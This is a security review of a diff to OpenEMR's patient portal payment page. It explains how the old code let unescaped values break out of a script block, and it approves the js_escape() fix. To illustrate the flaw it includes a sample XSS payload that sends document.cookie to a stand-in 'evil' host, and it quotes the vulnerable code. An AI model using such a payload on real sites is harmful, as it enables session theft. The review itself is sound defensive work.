# Security Review: `portal/portal_payment.php`

## Summary

**This diff introduces no new vulnerabilities. It fixes an existing XSS flaw.** I recommend approving it.

## What the change fixes

**Location:** `portal/portal_payment.php`, line ~91
**OWASP category:** A03:2021 Injection (Cross-Site Scripting)
**Severity of the original issue:** High

### Before

```php
echo "<script>var jsondata='" . $edata['table_args'] . "';var ccdata='" . $edata['checksum'] . "'</script>";
```

`table_args` and `checksum` were written into a single-quoted JavaScript string inside a `<script>` block with no encoding. If either value contained attacker-influenced content, it could execute script in the patient portal session:

- A `'` could end the string and inject JavaScript, e.g. `';fetch('//evil/'+document.cookie);//`.
- A `</script>` could end the script block and inject HTML or script.

This is especially relevant because `table_args` holds invoice and payment data, which may come from portal input. That makes it a stored XSS vector on a page that handles payments.

### After

```php
echo "<script>var jsondata=" . js_escape($edata['table_args']) . ";var ccdata=" . js_escape($edata['checksum']) . "</script>";
```

OpenEMR's `js_escape()` wraps `json_encode()`. As a result:

- Each value becomes a properly quoted JavaScript string literal, and quotes and backslashes are escaped.
- `/` is escaped by default, so `</script>` becomes `<\/script>` and cannot close the script block.
- The removal of the hand-written quotes is correct. `js_escape()` adds its own quotes, so `jsondata` and `ccdata` are still strings. Existing client code that calls `JSON.parse(jsondata)` should keep working.

## Points to verify (not blocking)

1. **`js_escape()` implementation:** Confirm it does not pass `JSON_UNESCAPED_SLASHES`. That flag would allow `</script>` to pass through unescaped. For extra hardening, consider `JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT`, which also covers edge cases like `<!--`.
2. **Ciphertext in the page (pre-existing, outside this diff):** The encrypted `checksum` is sent to the browser. The server decrypts it with `decryptStandard()`. Exposing ciphertext is not a flaw in itself. Still, check that the client never sends this value back as trusted payment data, and that payment amounts are re-validated on the server. Otherwise this would be an A04 Insecure Design or A08 Integrity Failure concern.
3. **Regression test:** Add a test that stores `table_args` containing `'`, `"`, `\`, and `</script>`. Confirm the page renders without breaking out of the script and that the client-side parsing still works.

## Verdict

| Item | Result |
|---|---|
| New vulnerabilities introduced | None |
| Vulnerabilities fixed | Stored/reflected XSS (A03:2021), High |
| Recommendation | Approve |